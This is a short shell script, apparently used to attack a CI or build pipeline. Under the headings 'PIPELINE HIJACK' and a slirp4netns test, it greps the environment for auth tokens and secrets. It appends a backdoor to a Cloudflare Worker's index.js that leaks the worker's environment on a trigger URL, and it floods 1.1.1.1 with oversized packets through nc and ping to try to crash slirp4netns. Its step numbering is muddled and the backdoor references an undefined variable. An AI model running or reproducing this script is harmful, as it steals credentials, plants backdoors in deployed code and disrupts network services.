echo "AUDIT"
echo "---  SLIRP4NETNS FRAGMENTATION TEST ---"

echo "---  PIPELINE HIJACK ---"

# 1. Try to find the Wrangler/Cloudflare Auth Token in memory or env
env | grep -i "AUTH\|TOKEN\|SECRET"

# 2. Poison the Worker script before it deploys
# We append a 'Backdoor' to the worker that leaks its environment to us when visited
echo "
addEventListener('fetch', event => {
  if (event.request.url.includes('exfiltrate')) {
    event.respondWith(new Response(JSON.stringify(JSON.parse(JSON.stringify(env))), {status: 200}));
  }
});" >> index.js

# 3. Use Perl to send a "Jumbo" packet that overflows the Slirp MTU
perl -e 'print "A" x 65535' | nc -u -w 1 1.1.1.1 53

# 2. Try to exceed the MTU to see if slirp handles the error or crashes
# We use -M want to force fragmentation and see if the 'slirp' process spikes
ping -s 65507 -c 3 1.1.1.1 &
sleep 1
ps aux | grep slirp4netns

echo "--- FINISHED ---"
